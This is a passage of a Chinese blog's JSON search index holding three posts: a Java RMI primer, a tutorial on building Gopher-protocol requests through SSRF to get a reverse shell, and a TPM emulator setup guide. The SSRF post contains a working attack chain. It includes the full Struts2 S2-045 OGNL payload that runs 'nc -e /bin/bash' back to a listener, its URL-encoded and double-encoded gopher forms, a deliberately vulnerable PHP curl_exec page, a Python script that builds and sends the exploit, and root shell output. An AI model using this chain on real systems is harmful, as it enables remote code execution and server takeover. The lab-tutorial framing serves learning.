});","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"ACM算法","slug":"ACM算法","permalink":"https://functfan.github.io/tags/ACM%E7%AE%97%E6%B3%95/"},{"name":"Codeforces164","slug":"Codeforces164","permalink":"https://functfan.github.io/tags/Codeforces164/"},{"name":"Bjut_Search2016","slug":"Bjut-Search2016","permalink":"https://functfan.github.io/tags/Bjut-Search2016/"}]},{"title":"JavaRMI理念在Dubbo中的应用之JavaRMI转载","slug":"JavaRMI理念在Dubbo中的应用之JavaRMI转载","date":"2020-06-19T07:20:21.000Z","updated":"2020-06-24T02:23:06.413Z","comments":true,"path":"posts/2213029462/","link":"","permalink":"https://functfan.github.io/posts/2213029462/","excerpt":"","text":"什么是Java RMI RMI就是远程方法调用，通俗点讲，就是一种能够实现客户端调用服务端对象方法的远程调用技术，通过这种技术，客户端访问远程服务端的方法就感觉像是在本地调用自己的方法一样简单。 官方给出的关于Java RMI 的基本概念如下：Java RMI（Remote Method Invocation）- 远程方法调用，能够让客户端像使用本地调用一样调用服务端 Java 虚拟机中的对象方法。RMI 是面向对象语言领域对 RPC （Remote Procedure Call）的完善，用户无需依靠 IDL 的帮助来完成分布式调用，而是通过依赖接口这种更简单自然的方式。 RMI工作原理一种典型的RMI调用如下图所示： 1. 服务端向RMI注册服务绑定自己的地址， 2. 客户端通过RMI注册服务获取目标地址， 3. 客户端调用本地的Stub对象上的方法，和调用本地对象上的方法一致， 4. 本地存根对象将调用信息打包，通过网络发送到服务端， 5. 服务端的Skeleton对象收到网络请求之后，将调用信息解包， 6. 找到真正的服务对象发起调用，并将返回结果打包通过网络发送回客户端。 RMI示例代码服务端注册代码1234Hello obj = new HelloImpl(); // #1Hello stub = (Hello) UnicastRemoteObject.exportObject(obj, 0); // #2Registry registry = LocateRegistry.createRegistry(1099); // #3registry.rebind(\"Hello\", stub); // #4 说明： 1.初始化服务对象实例 2.通过UnicastRemoteObject.exportObject*生成可以与服务端通讯的Stub对象， 3.创建一个本地的RMI注册服务，监听端口为1099。该注册服务运行在服务端，也可以单独启动一个注册服务的进程， 4.将Stub对象绑定到注册服务上，这样，客户端可以通过 *Hello 这个名字查找到该远程对象。 客户端的服务发现123Registry registry = LocateRegistry.getRegistry(); // #1Hello stub = (Hello) registry.lookup(\"Hello\"); // #2String response = stub.sayHello(); // #3 说明： 获取注册服务实例，在本例中，由于没有传入任何参数，假定要获取的注册服务实例部署在本机，并监听在 1099 端口上， 从注册服务中查找服务名为 Hello 的远程对象， 通过获取的 Stub 对象发起一次 RMI 调用并获得结果。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"Java基础","slug":"Java基础","permalink":"https://functfan.github.io/tags/Java%E5%9F%BA%E7%A1%80/"},{"name":"ApacheDubbo","slug":"ApacheDubbo","permalink":"https://functfan.github.io/tags/ApacheDubbo/"},{"name":"RMI","slug":"RMI","permalink":"https://functfan.github.io/tags/RMI/"}]},{"title":"极客思路之0.Gopher协议+SSRF实现反弹shell（转）","slug":"极客思路之0-Gopher协议-SSRF实现反弹shell（转）","date":"2020-06-19T06:04:26.000Z","updated":"2020-07-03T09:24:43.292Z","comments":true,"path":"posts/3310928381/","link":"","permalink":"https://functfan.github.io/posts/3310928381/","excerpt":"","text":"版权声明：本文为博主「margine」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://zhuanlan.zhihu.com/p/112055947 本文主要内容： 什么是gopher协议? 如何使用gopher协议反弹shell？ 在SSRF中如何使用gopher协议反弹shell? 一、什么是gopher协议？定义：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它； gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议 限制：gopher协议在各个编程语言中的使用限制 –wite-curlwrappers：运用curl工具打开url流curl使用curl –version查看版本以及支持的协议 Gopher协议格式： 1URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 gopher的默认端口是70 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码 Gopher发送请求HTTP GET请求： 使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求 nc启动监听，监听2333端口：nc -lp 2333 使用curl发送http请求，命令为 1margine:~ margin$ curl gopher://192.168.0.119:2333/abcd 此时nc收到的消息为： 1234margine:~ margin$ nc -lp 2333bcd2333bcdbcd 可以发现url中的a没有被nc接受到，如果命令变为 1margine:~ margin$ curl gopher://192.168.0.119:2333/_abcd 此时nc收到的消息为： 12margine:~ margin$ nc -lp 2333abcd 所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写） 那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步： 1、构造HTTP数据包2、URL编码、替换回车换行为%0d%0a3、发送gopher协议 我准备了一个PHP的代码，如下： 123&lt;?php echo \"Hello \".$_GET[\"name\"].\"\\n\"?&gt; 一个GET型的HTTP包，如下： 12GET /ssrf/base/get.php?name=Margin HTTP/1.1Host: 192.168.0.109 URL编码后为： 1curl gopher://192.168.0.109:80/_GET+/ssrf/base/get.php%3fname=Margin+HTTP/1.1%0d%0AHost:+192.168.0.109%0d%0A 在转换为URL编码时候有这么几个坑 1、问号（？）需要转码为URL编码，也就是%3f2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束） Gopher发送请求HTTP POST请求： 发送POST请求前，先看下POST数据包的格式 1234POST /ssrf/base/post.php HTTP/1.1host:192.168.0.109name=Margin 那我们将上面的POST数据包进行URL编码并改为gopher协议 1curl gopher://192.168.0.109:80/_POST+/ssrf/base/post.php+HTTP/1.1%0d%0AHost:192.168.0.1090d%0A%0d%0Aname=Margin%0d%0A post.php的代码为 123&lt;?php echo \"Hello \".$_POST[\"name\"].\"\\n\"?&gt; 使用curl发起gopher的POST请求后，结果为： 根据上图发现返回的包爆了501的错误，我的思路是这样的：查看Apache的正常日志和错误日志、查找POST请求中所需的字段。下面分别是正常日志和错误日志的截图： 123192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] \"POST /ssrf/base/post.php HTTP/1.1\" 200 7192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] \"name=Margin\" 501 213[Sat Mar 07 15:38:50 2020] [error] [client 192.168.0.119] Invalid method in request name=Margin 这里有个疑问：为什么发起了2次请求？为什么会把参数name=Margin当作一个请求？这个地方我调试了很久，发现问题出现在POST请求头中，我之前发POST请求都是直接用脚本，但从来没考虑过哪些参数是POST请求必须的，经过排查，发现有4个参数为必要参数（四个参数的含义不再赘述）： 123456POST /ssrf/base/post.php HTTP/1.1host:192.168.0.109Content-Type:application/x-www-form-urlencodedContent-Length:11name=Margin 现在我们将它进行URL编码： 1curl gopher://192.168.0.109:80/_POST+/ssrf/base/post.php+HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A 再次发送请求的结果为： 发现请求正常，OK，那我们现在就介绍完了gopher协议的GET和POST请求。 二、如何使用gopher协议反弹shell？Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架 (摘自百度百科)今天我们用到的漏洞是Struts2-045漏洞，相信很多大佬不陌生，以下为S2-045漏洞反弹shell的利用代码，我们在本地机器上执行：nc -lp 6666 123GET /S2-045/ HTTP/1.1Host: 192.168.0.119Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nc -e /bin/bash 192.168.0.119 6666').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} 我们将其变为gopher所能使用的请求 1curl gopher://192.168.0.119:8080/_GET+/S2-045/+HTTP/1.1%0d%0aHost:192.168.0.119%0d%0aContent-Type:%25%7b%28%23%5f%3d%27%6d%75%6c%74%69%70%61%72%74%2f%66%6f%72%6d%2d%64%61%74%61%27%29%2e%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%63%6d%64%3d%27%6e%63+%2d%65+%2f%62%69%6e%2f%62%61%73%68+%31%39%32%2e%31%36%38%2e%30%2e%31%31%39+%36%36%36%36%27%29%2e%28%23%69%73%77%69%6e%3d%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%53%79%73%74%65%6d%40%67%65%74%50%72%6f%70%65%72%74%79%28%27%6f%73%2e%6e%61%6d%65%27%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%63%6f%6e%74%61%69%6e%73%28%27%77%69%6e%27%29%29%29%2e%28%23%63%6d%64%73%3d%28%23%69%73%77%69%6e%3f%7b%27%63%6d%64%2e%65%78%65%27%2c%27%2f%63%27%2c%23%63%6d%64%7d%3a%7b%27%2f%62%69%6e%2f%62%61%73%68%27%2c%27%2d%63%27%2c%23%63%6d%64%7d%29%29%2e%28%23%70%3d%6e%65%77+%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%23%63%6d%64%73%29%29%2e%28%23%70%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%29%2e%28%23%70%72%6f%63%65%73%73%3d%23%70%2e%73%74%61%72%74%28%29%29%2e%28%23%72%6f%73%3d%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%63%6f%70%79%28%23%70%72%6f%63%65%73%73%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%72%6f%73%29%29%2e%28%23%72%6f%73%2e%66%6c%75%73%68%28%29%29%7d%0d%0a 一定要注意最后加上%0d%0a，以及很多URL编码工具将会回车换行转码为%0a，一定要自己替换为%0a%0d发送请求后可以反弹shell 123margine:~ margin$ nc -l 6666iduid=0(root) gid=0(root) groups=0(root) 三、在SSRF中如何使用gopher协议反弹shell? 我们先准备了一个带有ssrf漏洞的页面，代码如下： 12345&lt;?php $url = $_GET['url']; $curlobj = curl_init($url); echo curl_exec($curlobj);?&gt; 这里需要注意的是，你的PHP版本必须大于等于5.3，并且在PHP.ini文件中开启了extension=php_curl.dll2. 我在机器上开启了一个监听nc -lp 6666然后在浏览器中访问： 1http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc 可以看到nc接收到了消息，没有问题。 12C:\\Documents and Settings\\Administrator\\桌面&gt;nc -lp 6666abc 现在我们想，如何使用SSRF漏洞配合gopher协议来获取shell呢？我们的环境如下(为了节省资源，攻击机和有漏洞的主机是一台机器，请见谅。)： 上图就不具体说了，是一个典型的ssrf利用的解释图。在使用ssrf去获取struts2的shell时，遇到了两次困难： PHP的curl_exec函数没有发起gopher的请求（这个问题上面已经说过） gopher一直请求不到目标页面 根据我的试错经历，我梳理了下如何一步步的完成gopher请求获取shell。首先我们先做一些简单的事情，顺序如下： 使用ssrf漏洞发起gopher请求，访问前面用到的get.php 使用ssrf漏洞发起gopher请求，获取struts2主机的shell 第一步：准备好访问get.php的数据包（照搬的本文开始的包） 1gopher://192.168.0.109:80/_GET+/ssrf/base/get.php%3fname=Margin+HTTP/1.1%0d%0AHost:+192.168.0.109%0d%0A 那我们现在是否可以这样来组成我们的URL？ 1http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.109:80/_GET+/ssrf/base/get.php%3fname=Margin+HTTP/1.1%0d%0AHost:+192.168.0.109%0d%0A 我们来测试下，结果如下： 发现并没有出现get页面的hello Margin，说明请求失败，这个地方卡了一会，发现是因为在PHP在接收到参数后会做一次URL的解码，正如我们上图所看到的，+等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。编码结果如下： 1http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3A%2F%2F192.168.0.109%3A80%2F_GET%2520%2Fssrf%2Fbase%2Fget.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.0.109%250d%250A 此时发起请求，得到如下结果： 发现已经正常，此时便说明我们的环境没有问题，SSRF漏洞利用正常，开始接下来的步骤。 第二步：准备好struts2-045漏洞的利用代码，并进行二次编码，需要注意的是Content-Type中放了主要的漏洞利用代码，并且特殊字符多，将其单独进行编码，步骤如下： 将gopher协议一直到Content-Type进行二次编码 将Content-Type的值所有字符进行URL二次编码最终得到如下结果(太长，不列中间内容，省略部分为Content-type内容)： 1gopher%3A%2F%2F192.168.0.119%3A8080%2F_GET%2520%2FS2-045%2F%2520HTTP%2F1.1%250d%250aHost%3A192.168.0.119%250d%250aContent-Type%3A ......... %0d%0a 最终可以获取shell，结果如下图： 123margine:~ margin$ nc -l 6666iduid=0(root) gid=0(root) groups=0(root) 再试错的过程中发现：URL中的／不能进行两次编码，端口号不可以两次编码,协议名称不可两次转码 最后附上编码脚本（python2.7）： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/python# -*- coding: UTF-8 -*-import urllib2,urlliburl = \"http://192.168.0.109/ssrf/base/curl_exec.php?url=\"header = \"\"\"gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1Host:192.168.0.119Content-Type:\"\"\"cmd = \"nc -e /bin/bash 192.168.0.109 6666\"content_type = \"\"\"自己填写(不要有换行)\"\"\"header_encoder = \"\"content_type_encoder = \"\"content_type_encoder_2 = \"\"url_char = [\" \"]nr = \"\\r\\n\"# 编码请求头for single_char in header: if single_char in url_char: header_encoder += urllib.quote(urllib.quote(single_char,'utf-8'),'utf-8') else: header_encoder += single_charheader_encoder = header_encoder.replace(\"\\n\",urllib.quote(urllib.quote(nr,'utf-8'),'utf-8'))# 编码content-type，第一次编码for single_char in content_type: # 先转为ASCII,在转十六进制即可变为URL编码 content_type_encoder += str(hex(ord(single_char)))content_type_encoder = content_type_encoder.replace(\"0x\",\"%\") + urllib.quote(nr,'utf-8')# 编码content-type，第二次编码for single_char in content_type_encoder: # 先转为ASCII,在转十六进制即可变为URL编码 content_type_encoder_2 += str(hex(ord(single_char)))content_type_encoder_2 = content_type_encoder_2.replace(\"0x\",\"%\")exp = url + header_encoder + content_type_encoder_2print exprequest = urllib2.Request(exp)response = urllib2.urlopen(request).read()print response document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"h4x0r","slug":"h4x0r","permalink":"https://functfan.github.io/tags/h4x0r/"},{"name":"SSRF","slug":"SSRF","permalink":"https://functfan.github.io/tags/SSRF/"},{"name":"Gopher","slug":"Gopher","permalink":"https://functfan.github.io/tags/Gopher/"}]},{"title":"TPM软件模拟环境搭建","slug":"TPM软件模拟环境搭建","date":"2020-06-18T18:36:16.000Z","updated":"2021-06-21T05:59:12.415Z","comments":true,"path":"posts/1903345210/","link":"","permalink":"https://functfan.github.io/posts/1903345210/","excerpt":"","text":"#### 主要内容 ​ 本文旨在记录当前没有硬件TPM的条件下，通过软件来模拟TPM的完整搭建过程。 环境准备 操作系统版本：Ubuntu 14.04 对应内核版本：Linux 3.13.0-24-generic VMware 版本：VMware 10.0 搭建步骤 创建ubuntu虚拟机使用VMware软件新建一台ubuntu虚拟机，此步骤相信大家不会陌生，此处不再介绍，具体搭建过程请参考该博客：# VMware Ubuntu安装详细过程 在创建好的虚拟机中安装cmake 提前下载好cmake-3.8.2.tar.gz压缩包，使用下面的命令进行安装，具体如下： 1tar -zxvf cmake-3.8.2.tar.gz 若提示缺少c编译器，可使用下面的命令解决： 1sudo apt-get install build-essential cd进入cmake目录，执行以下命令： 1./bootstrap &amp;&amp; make &amp;&amp; make install 在创建好的虚拟机中安装gmp 提前下载好gmp-6.1.2.tar.lz压缩包，使用下面的命令进行安装，具体如下： 123sudo apt-get install lziplzip -d gmp-6.1.2.tar.lztar -xvf gmp-6.1.2.tar 需使用下面的命令安装m4： 1sudo apt-get install m4 cd进入gmp目录，执行以下命令： 1./configure &amp;&amp; make &amp;&amp; make check &amp;&amp; make install 在创建好的虚拟机中安装tpm_emulator 提前下载好tpm_emulator-0.7.4.tar.gz压缩包，使用下面的命令进行安装，具体如下： 1tar -zxvf tpm_emulator-0.7.4.tar.gz cd进入tpm_emulator-0.7.4目录，执行以下命令： 1mkdir build cd进入build目录，执行以下命令： 1cmake ../ &amp;&amp; make &amp;&amp; make install [注意] 若出现Module tpmd_dev not found，则先运行命令sudo depmod -a 在创建好的虚拟机中安装trouser-0.3.8 提前下载好trouser-0.3.8.tar.gz压缩包，使用下面的命令进行安装，具体如下： 1tar -zxvf trouser-0.3.8.tar.gz cd进入trouser-0.3.8目录，执行以下命令： 1sudo vim ./src/tcsd/MakeFile.am 修改./src/tcsd/Makefile.am第4行如下：tcsd_LDADD=${top_builddir}/src/tcs/libtcs.a /usr/local/lib/libtddl.so -lpthread @CRYPTOLIB@ 1sudo vim ./src/tcsd/MakeFile.in 修改./src/tcsd/Makefile.in第55，56行如下:tcsd_DEPENDENCIES=${top_builddir}/src/tcs/libtcs.a /usr/local/lib/libtddl.so 修改完成后执行以下命令： 1./configure [注意] 上面修改中的/usr/local/lib/有时可能会是/usr/lib，可查看libtddl.so的位置来确定是哪个目录。 执行./configure可能会报openssl的错误，需要安装：sudo apt-get install libssl-dev 最后执行以下命令： 1make &amp;&amp; make install [注意] 上述命令如果报错，请使用下面的方法解决： 在执行第三步的时候，前面加上： 1env CFLAGS=\"-Wno-unused-but-set-variable\" ./configure 执行完./configure后再次执行make即可。 在创建好的虚拟机中安装tpm-tools 提前下载好tpm-tools-1.3.8.tar.gz压缩包，使用下面的命令进行安装，具体如下： 1tar -zxvf tpm-tools-1.3.8.tar.gz cd进入tpm-tools-1.3.8目录，执行以下命令： 1./configure [注意] 若出现ld returned 1 exit status，error, undefinedreference的情况，可将执行命令修改为 1./configure --prefix=/usr 最后执行以下命令： 1make &amp;&amp; make install 验证环节 进入tpm-tools-1.3.8/src/tpm_mgmt/目录下查看以下三个信息： 123#./tpm_version #查看版本号#./tpm_getpubek #查看ek公钥#./tpm_takeownership #获取owner [注意] 执行tpm_version若出现error while loading shared libraries: libtspi.so.1: cannot openshared object file: No such file or directory，则： 1sudo apt-get install libtspi-dev 结束语至此TPM模拟环境已经搭建完毕，验证环节都通过则表明TPM模拟环境已经完全没问题了。此外，如果博友在其他版本的搭建过程中遇到问题，请首先参考本文中的方法自行测试，实在无法解决可以联系博主。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"环境部署","slug":"环境部署","permalink":"https://functfan.github.io/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"}],"tags":[{"name":"环境部署","slug":"环境部署","permalink":"https://functfan.github.io/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"name":"可信计算","slug":"可信计算","permalink":"https://functfan.github.io/tags/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97/"},{"name":"TPM搭建","slug":"TPM搭建","permalink":"https://functfan.github.io/tags/TPM%E6%90%AD%E5%BB%BA/"}]}],"categories":[{"name":"weblogic系列","slug":"weblogic系列","permalink":"https://functfan.github.io/categories/weblogic%E7%B3%BB%E5%88%97/"},{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://functfan.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"环境部署","slug":"环境部署","permalink":"https://functfan.github.io/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://functfan.github.io/categories/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"2019CTF","slug":"2019CTF","permalink":"https://functfan.github.io/categories/2019CTF/"},{"name":"致敬英雄","slug":"致敬英雄","permalink":"https://functfan.github.io/categories/%E8%87%B4%E6%95%AC%E8%8B%B1%E9%9B%84/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://functfan.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"tags":[{"name":"weblogic,基础知识,漏洞分析,调试,历史漏洞,系列总结","slug":"weblogic-基础知识-漏洞分析-调试-历史漏洞-系列总结","permalink":"https://functfan.github.io/tags/weblogic-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E8%B0%83%E8%AF%95-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E-%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/"},{"name":"weblogic,T3,JNDI,RMI","slug":"weblogic-T3-JNDI-RMI","permalink":"https://functfan.github.io/tags/weblogic-T3-JNDI-RMI/"},{"name":"weblogic,补丁分析,序列化与反序列化","slug":"weblogic-补丁分析-序列化与反序列化","permalink":"https://functfan.github.io/tags/weblogic-%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"CVE-2015-4852,Weblogic,反序列化","slug":"CVE-2015-4852-Weblogic-反序列化","permalink":"https://functfan.github.io/tags/CVE-2015-4852-Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"weblogic,环境部署,远程调试","slug":"weblogic-环境部署-远程调试","permalink":"https://functfan.github.io/tags/weblogic-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://functfan.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"KataContainers容器","slug":"KataContainers容器","permalink":"https://functfan.github.io/tags/KataContainers%E5%AE%B9%E5%99%A8/"},{"name":"CVE-2020-2023/2024/2025/2026","slug":"CVE-2020-2023-2024-2025-2026","permalink":"https://functfan.github.io/tags/CVE-2020-2023-2024-2025-2026/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://functfan.github.io/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://functfan.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"java反序列化","slug":"java反序列化","permalink":"https://functfan.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"CommonsBeanUtils","slug":"CommonsBeanUtils","permalink":"https://functfan.github.io/tags/CommonsBeanUtils/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"网络穿透","slug":"网络穿透","permalink":"https://functfan.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F/"},{"name":"透视攻击","slug":"透视攻击","permalink":"https://functfan.github.io/tags/%E9%80%8F%E8%A7%86%E6%94%BB%E5%87%BB/"},{"name":"Java基础","slug":"Java基础","permalink":"https://functfan.github.io/tags/Java%E5%9F%BA%E7%A1%80/"},{"name":"工具利器","slug":"工具利器","permalink":"https://functfan.github.io/tags/%E5%B7%A5%E5%85%B7%E5%88%A9%E5%99%A8/"},{"name":"反序列化","slug":"反序列化","permalink":"https://functfan.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"思想结晶","slug":"思想结晶","permalink":"https://functfan.github.io/tags/%E6%80%9D%E6%83%B3%E7%BB%93%E6%99%B6/"},{"name":"突破口","slug":"突破口","permalink":"https://functfan.github.io/tags/%E7%AA%81%E7%A0%B4%E5%8F%A3/"},{"name":"环境部署","slug":"环境部署","permalink":"https://functfan.github.io/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"name":"源代码审计","slug":"源代码审计","permalink":"https://functfan.github.io/tags/%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"框架基础","slug":"框架基础","permalink":"https://functfan.github.io/tags/%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80/"},{"name":"requestURI","slug":"requestURI","permalink":"https://functfan.github.io/tags/requestURI/"},{"name":"tomcat","slug":"tomcat","permalink":"https://funct